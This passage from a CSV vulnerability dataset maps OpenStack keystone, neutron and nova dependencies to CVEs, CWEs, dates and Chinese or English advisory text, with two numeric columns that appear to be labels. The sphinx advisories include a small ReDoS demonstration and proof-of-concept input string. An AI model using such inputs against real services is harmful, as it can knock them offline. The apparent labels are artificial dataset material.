openstack_keystone,cryptography,>=2.7,True,CVE-2023-2650,CWE-770,2023-05-30,OpenSSL是OpenSSL团队的一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。该漏洞源于处理特制的ASN.1对象标识符时可能非常慢，导致系统拒绝服务。,3,0
openstack_keystone,cryptography,>=2.7,True,CVE-2023-50782,CWE-208 CWE-203,2023-12-13,"python-cryptography是Cryptographic团队的一个应用于加密的 Python 代码库。
python-cryptography存在安全漏洞。攻击者利用该漏洞可以获取敏感信息。",2,2
openstack_keystone,cryptography,>=2.7,True,CVE-2022-3996,CWE-667,2022-12-13,OpenSSL是一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库，支持多种加密算法。如果X.509证书包含格式错误的策略约束并且启用了策略处理，系统将递归地获取两次写锁，导致在某些操作系统上进程挂起，进而造成拒绝服务。,2,2
openstack_keystone,cryptography,>=2.7,True,CVE-2022-4203,CWE-125,2023-02-07,OpenSSL是一个开源的能够实现SSL和TLS协议的通用加密库，支持多种加密算法。该漏洞源于在X.509证书验证中，尤其是在名称约束检查阶段，可以触发读缓冲区溢出。,3,0
openstack_keystone,cryptography,>=2.7,True,CVE-2023-0216,CWE-476,2023-02-07,OpenSSL是一个开源的能够实现安全套接层和安全传输层协议的通用加密库，支持多种加密算法。存在无效指针解引用漏洞。当应用程序尝试使用 d2i_PKCS7()、d2i_PKCS7_bio() 或 d2i_PKCS7_fp() 函数加载格式错误的 PKCS7 数据时，可能会导致程序崩溃。,2,2
openstack_keystone,cryptography,>=2.7,True,CVE-2023-3817,CWE-606 CWE-834,2023-07-31,OpenSSL是一个开源的能够实现安全套接层和安全传输层协议的通用加密库，常用于车云通信中对传输协议的加解密。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。OpenSSL在部分版本中存在使用DH_check等函数检查DH参数时耗时较长的漏洞，导致拒绝服务。,3,2
openstack_keystone,cryptography,>=2.7,True,CVE-2023-3446,CWE-606 CWE-1333,2023-07-19,OpenSSL是一个开源的安全套接层和安全传输层协议的通用加密库，支持多种加密算法。在某些版本的OpenSSL中，DH_check()、DH_check_ex()或EVP_PKEY_param_check()函数在处理过大的DH密钥或参数时可能导致应用程序变得非常缓慢，造成拒绝服务。,3,2
openstack_keystone,cryptography,>=2.7,True,CVE-2023-2975,CWE-354 CWE-287,2023-07-14,"OpenSSL是OpenSSL团队的一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。
OpenSSL存在授权问题漏洞，该漏洞源于密码实现存在错误，AES-SIV忽略空的关联数据条目，导致允许对多个关联的进行身份验证数据条目进行加密。",3,2
openstack_keystone,cryptography,>=2.7,True,CVE-2023-38325,CWE-295,2023-07-14,"python-cryptography是Cryptographic团队的一个应用于加密的 Python 代码库。
python-cryptography 41.0.2之前版本存在安全漏洞，该漏洞源于会错误地处理具有关键选项的 SSH 证书。",2,2
openstack_keystone,cryptography,>=2.7,True,CVE-2023-4807,CWE-440,2023-09-08,OpenSSL是OpenSSL团队的一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。 OpenSSL 1.1.1 至 1.1.1v版本、3.0.0 至 3.0.10 版本以及 3.1.0 至 3.1.2版本存在安全漏洞，该漏洞源于POLY1305 MAC（消息身份验证代码）包含一个错误，当在支持 AVX512-IFMA 指令的较新 X86_64 处理器上运行时，可能会破坏 Windows 64 平台上的应用程序内部状态。,2,0
openstack_keystone,cryptography,>=2.7,True,CVE-2024-4603,CWE-606 CWE-834,2024-05-16,"OpenSSL是OpenSSL团队的一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。
OpenSSL 3.0 和 3.1 版本存在安全漏洞，该漏洞源于使用函数 EVP_PKEY_param_check()、EVP_PKEY_public_check() 检查 DSA 公钥或 DSA 参数检查的键或参数，可能会导致拒绝服务。",3,2
openstack_keystone,oslo.utils,>=3.33.0,True,CVE-2022-0718,CWE-522 CWE-532,2022-02-21,"Python-Oslo-Utils是OpenStack社区的一个库。用于提供对常见实用程序类型函数的支持，例如编码、异常处理、字符串操作和时间处理。
Python-Oslo-Utils 存在安全漏洞，目前暂无该漏洞信息，请随时关注CNNVD或厂商公告。",3,0
openstack_keystone,oauthlib,>=0.6.2,True,,CWE-534,2017-12-04,"## Overview
Affected versions of [`oauthlib`](https://pypi.python.org/pypi/oauthlib) are vulnerable to Information Exposure Through Debug Log Files which happend because the debug log printed password to the log files.

## Remediation
Upgrade `oauthlib` to version 0.7.0 or higher.

## References
- [GitHub Changelog](https://github.com/idan/oauthlib/blob/master/CHANGELOG.rst#070-2014-10-27)
- [Github Issue](https://github.com/idan/oauthlib/issues/256)
- [Github Commit](https://github.com/idan/oauthlib/commit/fef1f7987cc6298e744b7d4290e3fc9a9701831b)
",2,2
openstack_keystone,pysaml2,>=5.0.0,True,CVE-2021-21238,CWE-347,2021-01-21,"Idpy Pysaml2是Idpy社区的一个基于Python的SAML服务器实现。
Idpy PySAML2 before 6.5.0 存在数据伪造问题漏洞，该漏洞源于存在加密签名验证错误漏洞。攻击者可利用该漏洞处理无效的XML文档。",3,0
openstack_keystone,pysaml2,>=5.0.0,True,CVE-2021-21239,CWE-347,2021-01-21,"Idpy Pysaml2是Idpy社区的一个基于Python的SAML服务器实现。
Idpy PySAML2 before 6.5.0 存在数据伪造问题漏洞，该漏洞源于加密签名验证错误。",3,1
openstack_keystone,PyJWT,>=1.6.1,True,CVE-2022-29217,CWE-327,2022-05-13,"pyjwt是美国José Padilla个人开发者的一个 Python 库。允许对 JSON Web 令牌（JWT）进行编码和解码。
pyjwt 1.5.0 - 2.3.0 版本存在加密问题漏洞，该漏洞源于使用了损坏或有风险的加密算法。远程攻击者利用此漏洞可导致密钥混淆。",2,0
openstack_keystone,msgpack,>=0.5.0,True,,CWE-400,2019-01-02,"## Overview

[msgpack](https://pypi.org/project/msgpack/) is a efficient binary serialization format.


Affected versions of this package are vulnerable to Denial of Service (DoS)
due to an unlimited length of maps.

## Details
Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](npm:ws:20171108)

## Remediation

Upgrade `msgpack` to version 0.6.0 or higher.


## References

- [GitHub Commit](https://github.com/msgpack/msgpack-python/commit/3b80233592674d18c8db7a62fa56504a5a285296)

- [GitHub PR](https://github.com/msgpack/msgpack-python/pull/319)
",3,0
openstack_keystone,Werkzeug,>=0.15.0,True,CVE-2023-25577,CWE-770,2023-02-14,"Pallets Werkzeug是一款WSGI Web应用程序库。
Pallets Werkzeug 2.2.3之前版本存在安全漏洞，该漏洞源于Werkzeug multipart表单数据解析器可以解析无限数量的文件、字节部分，但每个部分都需要 CPU 时间来解析，并且可能会使用更多内存，如果向 `request.data`、`request.form`、`request.files` 或 `request.get_data(parse_form_data=False)` 的端点发出请求，则可能会导致意外的高资源使用率，攻击者利用该漏洞可以导致拒绝服务。",2,2
openstack_keystone,Werkzeug,>=0.15.0,True,CVE-2023-23934,CWE-20,2023-02-14,"Pallets Werkzeug是一款WSGI Web应用程序库。
Pallets Werkzeug 2.2.3之前版本存在安全漏洞，该漏洞源于浏览器可能允许看起来像“=value”而不是“key=value”的“无名”cookie。",4,0
openstack_keystone,Werkzeug,>=0.15.0,True,CVE-2022-29361,CWE-444,2022-05-24,"Pallets Werkzeug是一款WSGI Web应用程序库。
Pallets Werkzeug 2.1.0版本及之前版本存在环境问题漏洞，该漏洞源于不正确解析 HTTP 的请求。攻击者利用该漏洞通过特制的 HTTP 请求执行 HTTP 请求走私。",1,1
openstack_keystone,Werkzeug,>=0.15.0,True,CVE-2023-46136,CWE-400 CWE-407 CWE-787,2023-10-24,"Pallets Werkzeug是一款WSGI Web应用程序库。
Pallets Werkzeug 3.0.1之前版本存在安全漏洞，该漏洞源于允许攻击者通过将精心设计的多部分数据发送导致拒绝服务。",2,0
openstack_keystone,Werkzeug,>=0.15.0,True,CVE-2019-14322,CWE-22,2019-07-28,Pallets Werkzeug 是一款WSGI Web应用程序库，提供了用于开发Web应用的工具和功能。在Pallets Werkzeug 0.15.5之前的版本中，SharedDataMiddleware组件存在安全漏洞。该漏洞的根本原因是SharedDataMiddleware错误处理了在Windows路径名称中的驱动程序名（例如：C:）。攻击者可以利用这一漏洞，通过构造特殊请求来访问服务器上的任意文件，导致信息泄露。,2,1
openstack_keystone,Werkzeug,>=0.15.0,True,,CWE-400,2023-11-01,"## Overview

Affected versions of this package are vulnerable to Denial of Service (DoS) due to slow multipart parsing for large parts.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)

## Remediation
Upgrade `werkzeug` to version 3.0.1 or higher.
## References
- [GitHub Commit](https://github.com/pallets/werkzeug/commit/b1916c0c083e0be1c9d887ee2f3d696922bfc5c1)
",2,2
openstack_keystone,Werkzeug,>=0.15.0,True,CVE-2019-14806,CWE-331,2019-08-09,"Pallets Werkzeug是一款WSGI Web应用程序库。
Pallets Werkzeug 0.15.3之前版本中存在安全漏洞，该漏洞源于Docker容器中调试程序PIN码随机不充分。目前尚无此漏洞的相关信息，请随时关注CNNVD或厂商公告。",2,2
openstack_keystone,Werkzeug,>=0.15.0,True,CVE-2024-34069,CWE-352,2024-05-06,"Werkzeug is a comprehensive WSGI web application library. The debugger in affected versions of Werkzeug can allow an attacker to execute code on a developer's machine under some circumstances. This requires the attacker to get the developer to interact with a domain and subdomain they control, and enter the debugger PIN, but if they are successful it allows access to the debugger even if it is only running on localhost. This also requires the attacker to guess a URL in the developer's application that will trigger the debugger. This vulnerability is fixed in 3.0.3.",2,0
openstack_keystone,Werkzeug,>=0.15.0,True,CVE-2024-49766,CWE-22,2024-10-25,Werkzeug 是 Pallets 开发的一个开源全面的WSGI Web应用程序库。在Werkzeug 3.0.6之前的版本中，存在一个路径遍历漏洞。该漏洞的根本原因是，当在Windows系统上且Python版本小于3.11时，os.path.isabs函数无法正确检测UNC路径。这可能导致Werkzeug的safe_join函数生成不安全的路径，从而允许潜在的非预期数据访问。,3,2
openstack_keystone,Werkzeug,>=0.15.0,True,CVE-2024-49767,CWE-400 CWE-770,2024-10-25,Werkzeug 是一个由 Pallets 开源的全面的 WSGI web 应用程序库，旨在为开发人员提供简单、灵活的工具来搭建 Web 应用程序。在 Werkzeug 3.0.6 之前的版本中，当解析 multipart/form-data 请求时存在拒绝服务漏洞。攻击者可以通过构建特制的请求来耗尽服务器资源，从而导致服务无法响应。,3,2
openstack_neutron,sphinx,>=2.2.0,True,CVE-2020-11022,CWE-79,2020-04-29,"jQuery是美国John Resig个人开发者的一套开源、跨浏览器的JavaScript库。该库简化了HTML与JavaScript之间的操作，并具有模块化、插件扩展等特点。
jQuery 1.2版本至3.5.0之前版本中存在跨站脚本漏洞。该漏洞源于WEB应用缺少对客户端数据的正确验证。攻击者可利用该漏洞执行客户端代码。",3,1
openstack_neutron,sphinx,>=2.2.0,True,CVE-2020-11023,CWE-79,2020-04-13,"jQuery是美国John Resig个人开发者的一套开源、跨浏览器的JavaScript库。该库简化了HTML与JavaScript之间的操作，并具有模块化、插件扩展等特点。
jQuery 1.0.3版本至3.5.0之前版本中存在跨站脚本漏洞。该漏洞源于WEB应用缺少对客户端数据的正确验证。攻击者可利用该漏洞执行客户端代码。",3,1
openstack_neutron,sphinx,>=2.2.0,True,,CWE-1333,2023-08-01,"## Overview

Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) due to the usage of an insecure regular expression in the function `load_v2` of `inventory.py`.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.

The Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.

Let’s take the following regular expression as an example:
```js
regex = /A(B|C+)+D/
```

This regular expression accomplishes the following:
- `A` The string must start with the letter 'A'
- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.
- `D` Finally, we ensure this section of the string ends with a 'D'

The expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`

It most cases, it doesn't take very long for a regex engine to find a match:

```bash
$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD"")'
0.04s user 0.01s system 95% cpu 0.052 total

$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX"")'
1.79s user 0.02s system 99% cpu 1.812 total
```

The entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.

Most Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.

Let's look at how our expression runs into this problem, using a shorter string: ""ACCCX"". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:
1. CCC
2. CC+C
3. C+CC
4. C+C+C.

The engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.

From there, the number of steps the engine must use to validate a string just continues to grow.

| String | Number of C's | Number of steps |
| -------|-------------:| -----:|
| ACCCX | 3 | 38
| ACCCCX | 4 | 71
| ACCCCCX | 5 | 136
| ACCCCCCCCCCCCCCX | 14 | 65,553


By the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.

## Remediation
Upgrade `sphinx` to version 3.3.0 or higher.
## References
- [GitHub Commit](https://github.com/sphinx-doc/sphinx/commit/f7b872e673f9b359a61fd287a7338a28077840d2)
- [GitHub Issue](https://github.com/sphinx-doc/sphinx/issues/8175)
",3,2
openstack_neutron,sphinx,>=2.2.0,True,,CWE-1333,2023-08-01,"## Overview

Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in google style docs, due to using an inefficient regex pattern with quantified overlapping adjacency.
## PoC
```
"" "" * 5000 + ""!""
```

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.

The Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.

Let’s take the following regular expression as an example:
```js
regex = /A(B|C+)+D/
```

This regular expression accomplishes the following:
- `A` The string must start with the letter 'A'
- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.
- `D` Finally, we ensure this section of the string ends with a 'D'

The expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`

It most cases, it doesn't take very long for a regex engine to find a match:

```bash
$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD"")'
0.04s user 0.01s system 95% cpu 0.052 total

$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX"")'
1.79s user 0.02s system 99% cpu 1.812 total
```

The entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.

Most Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.

Let's look at how our expression runs into this problem, using a shorter string: ""ACCCX"". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:
1. CCC
2. CC+C
3. C+CC
4. C+C+C.

The engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.

From there, the number of steps the engine must use to validate a string just continues to grow.

| String | Number of C's | Number of steps |
| -------|-------------:| -----:|
| ACCCX | 3 | 38
| ACCCCX | 4 | 71
| ACCCCCX | 5 | 136
| ACCCCCCCCCCCCCCX | 14 | 65,553


By the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.

## Remediation
Upgrade `sphinx` to version 3.3.0 or higher.
## References
- [GitHub Commit](https://github.com/sphinx-doc/sphinx/commit/f00e75278c5999f40b214d8934357fbf0e705417)
- [GitHub Issue](https://github.com/sphinx-doc/sphinx/issues/8172)
- [Vulnerable Code](https://github.com/sphinx-doc/sphinx/blob/31f26a0bbf5e4e53b340e10464fc7c4cca96f12a/sphinx/ext/napoleon/docstring.py#L34)
",3,2
openstack_neutron,PyMySQL,>=0.6.2,True,CVE-2024-36039,CWE-89,2024-05-21,当PyMySQL 1.1.0及以下版本与未受信任的JSON输入一起使用时，由于escape_dict未能对键进行转义，导致存在SQL注入漏洞。攻击者通过构造恶意的JSON输入，可以在数据库层面执行任意SQL命令。,3,0
openstack_neutron,requests,>=2.32.3,True,CVE-2024-47081,CWE-522,2025-06-06,Requests库用于发送HTTP请求的Python库。该漏洞涉及Netrc凭证泄漏，可能导致敏感信息泄露。,3,2
openstack_neutron,Jinja2,>=2.10,True,CVE-2020-28493,CWE-400,2021-02-01,"Jinja2是一款基于Python的模板引擎。该产品具有完整的Unicode支持，并提供了可选的沙箱模板执行环境。
jinja2 from 0.0.0 and before 2.11.3 存在资源管理错误漏洞，该漏洞源于regex的ReDOS漏洞。",3,2
openstack_neutron,Jinja2,>=2.10,True,CVE-2019-10906,CWE-693,2019-04-06,"Pallets Jinja是一款使用Python语言编写的模板引擎。
Pallets Jinja 2.10.1之前版本中存在权限许可和访问控制问题漏洞。攻击者可利用该漏洞绕过沙盒保护。",2,2
openstack_neutron,Jinja2,>=2.10,True,CVE-2024-22195,CWE-79,2024-01-11,"Pallets Jinja是一款使用Python语言编写的模板引擎。
Jinja 3.1.3之前版本存在安全漏洞，该漏洞源于存在跨站脚本（XSS）漏洞。",3,0
openstack_neutron,Jinja2,>=2.10,True,CVE-2024-34064,CWE-79,2024-05-06,"Pallets Jinja是一款使用Python语言编写的模板引擎。
Pallets Jinja 3.1.4之前版本存在安全漏洞，该漏洞源于将用户输入作为键传递给 xmlattr 过滤器时，Jinja 容易受到 HTML 属性注入。",3,0
openstack_neutron,Jinja2,>=2.10,True,CVE-2024-56326,CWE-693 CWE-1336,2024-12-23,Jinja 是由 Pallets 开源的一个快速、富有表现力并可扩展的模板引擎。该漏洞存在于 Jinja 版本 3.1.5 之前，由于在沙箱环境中对 str.format 调用的检测存在不当，攻击者可以控制模板的内容并执行任意 Python 代码。攻击者可以通过创建包含恶意字符串的模板并利用自定义过滤器实现攻击，这可能导致系统安全性严重受损。,3,0
openstack_neutron,Jinja2,>=2.10,True,CVE-2024-56201,CWE-150,2024-12-23,Jinja是Pallets开源的一个快速、富有表现力且可扩展的模板引擎。版本3.1.5之前的Jinja存在安全漏洞，该漏洞源于编译器的一个错误，允许同时控制模板内容和文件名的攻击者执行任意Python代码，无论Jinja的沙箱是否被使用。当应用程序执行不可信的模板时，攻击者需要能够控制模板的文件名和内容，才能有效利用此漏洞。,3,0
openstack_neutron,Jinja2,>=2.10,True,CVE-2025-27516,CWE-1336,2025-03-05,Jinja2 是一个广泛用于Web应用程序的模板引擎，用于渲染模板。该漏洞源于 Jinja2 沙盒环境与 `|attr` 过滤器交互时的一个疏忽。特别是，当攻击者能够控制模板的内容时，就可以利用此缺陷执行任意 Python 代码。这意味着，如果某个应用程序处理不可信的模板，就可能受到威胁，从而导致未经授权的系统访问或操作。,3,2
openstack_neutron,WebOb,>=1.8.2,True,CVE-2024-42353,CWE-601,2024-08-14,"WebOb是Pylons开源的一个 WSGI 请求和响应对象。
WebOb 1.8.8之前版本存在安全漏洞，该漏洞源于存在打开重定向。",3,0
openstack_neutron,pyOpenSSL,>=17.1.0,True,CVE-2018-1000807,CWE-416,2018-10-08,"Python Cryptographic Authority pyopenssl是一款基于Python的OpenSSL库。

Python Cryptographic Authority pyopenssl 17.5.0之前版本中对X509对象的处理方法存在释放后重用漏洞。远程攻击者可利用该漏洞造成拒绝服务或执行代码。",2,0
openstack_neutron,pyOpenSSL,>=17.1.0,True,CVE-2018-1000808,CWE-404,2018-10-08,"Python Cryptographic Authority pyopenssl是一款基于Python的OpenSSL库。

Python Cryptographic Authority pyopenssl 17.5.0之前版本中存在安全漏洞。攻击者可利用该漏洞造成拒绝服务。",2,0
openstack_neutron,requests,>=2.14.2,True,CVE-2018-18074,CWE-522,2018-10-09,"Requests package for Python是一款基于Python的开源HTTP库。
Requests package for Python 2.19.1及之前版本（2018-09-14之前发布）中存在安全漏洞，该漏洞源于程序在接收到从https转换到http的重定向请求（带有相同主机名）时，会将HTTP Authorization包头发送到http URI。远程攻击者可通过嗅探网络利用该漏洞获取凭证。",2,2
openstack_neutron,requests,>=2.14.2,True,CVE-2024-35195,CWE-670,2024-05-20,"Requests是Python基金会的一个优雅而简单的HTTP库。通过请求，您可以非常轻松地发送HTTP / 1.1请求。无需将查询字符串手动添加到您的URL，也无需对POST数据进行表单编码。
Requests 2.32.0之前版本存在安全漏洞，该漏洞源于禁用证书验证后在连接的生命周期中持续存在，后续所有请求都将被忽略。",3,0
openstack_neutron,requests,>=2.14.2,True,CVE-2024-47081,CWE-522,2025-06-06,Requests库用于发送HTTP请求的Python库。该漏洞涉及Netrc凭证泄漏，可能导致敏感信息泄露。,3,2
openstack_neutron,requests,>=2.14.2,True,,,,<p>Python Requests 是一个用于发送 HTTP 请求的开源库，广泛用于 Web 应用程序中。当请求涉及到公共后缀域的 Set-Cookie 头时，可能会导致 Cookie 被错误地发送到所有公共后缀域。此漏洞的根本原因在于 Python Requests 在处理包含公共后缀的 Cookie 域时，未能正确限制 Cookie 的发送。攻击者可以利用这个漏洞，诱使用户访问特定 URL，从而在请求过程中窃取敏感信息。</p>,2,1
openstack_nova,sphinx,>=2.1.1,True,CVE-2020-11022,CWE-79,2020-04-29,"jQuery是美国John Resig个人开发者的一套开源、跨浏览器的JavaScript库。该库简化了HTML与JavaScript之间的操作，并具有模块化、插件扩展等特点。
jQuery 1.2版本至3.5.0之前版本中存在跨站脚本漏洞。该漏洞源于WEB应用缺少对客户端数据的正确验证。攻击者可利用该漏洞执行客户端代码。",3,1
openstack_nova,sphinx,>=2.1.1,True,CVE-2020-11023,CWE-79,2020-04-13,"jQuery是美国John Resig个人开发者的一套开源、跨浏览器的JavaScript库。该库简化了HTML与JavaScript之间的操作，并具有模块化、插件扩展等特点。
jQuery 1.0.3版本至3.5.0之前版本中存在跨站脚本漏洞。该漏洞源于WEB应用缺少对客户端数据的正确验证。攻击者可利用该漏洞执行客户端代码。",3,1
openstack_nova,sphinx,>=2.1.1,True,,CWE-1333,2023-08-01,"## Overview

Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) due to the usage of an insecure regular expression in the function `load_v2` of `inventory.py`.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.

The Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.

Let’s take the following regular expression as an example:
```js
regex = /A(B|C+)+D/
```

This regular expression accomplishes the following:
- `A` The string must start with the letter 'A'
- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.
- `D` Finally, we ensure this section of the string ends with a 'D'

The expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`

It most cases, it doesn't take very long for a regex engine to find a match:

```bash
$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD"")'
0.04s user 0.01s system 95% cpu 0.052 total

$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX"")'
1.79s user 0.02s system 99% cpu 1.812 total
```

The entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.

Most Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.

Let's look at how our expression runs into this problem, using a shorter string: ""ACCCX"". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:
1. CCC
2. CC+C
3. C+CC
4. C+C+C.

The engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.

From there, the number of steps the engine must use to validate a string just continues to grow.

| String | Number of C's | Number of steps |
| -------|-------------:| -----:|
| ACCCX | 3 | 38
| ACCCCX | 4 | 71
| ACCCCCX | 5 | 136
| ACCCCCCCCCCCCCCX | 14 | 65,553


By the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.

## Remediation
Upgrade `sphinx` to version 3.3.0 or higher.
## References
- [GitHub Commit](https://github.com/sphinx-doc/sphinx/commit/f7b872e673f9b359a61fd287a7338a28077840d2)
- [GitHub Issue](https://github.com/sphinx-doc/sphinx/issues/8175)
",3,2
openstack_nova,sphinx,>=2.1.1,True,,CWE-1333,2023-08-01,"## Overview

Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in google style docs, due to using an inefficient regex pattern with quantified overlapping adjacency.
## PoC
```
"" "" * 5000 + ""!""
```

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.

The Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.

Let’s take the following regular expression as an example:
```js
regex = /A(B|C+)+D/
```

This regular expression accomplishes the following:
- `A` The string must start with the letter 'A'
- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.
- `D` Finally, we ensure this section of the string ends with a 'D'

The expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`

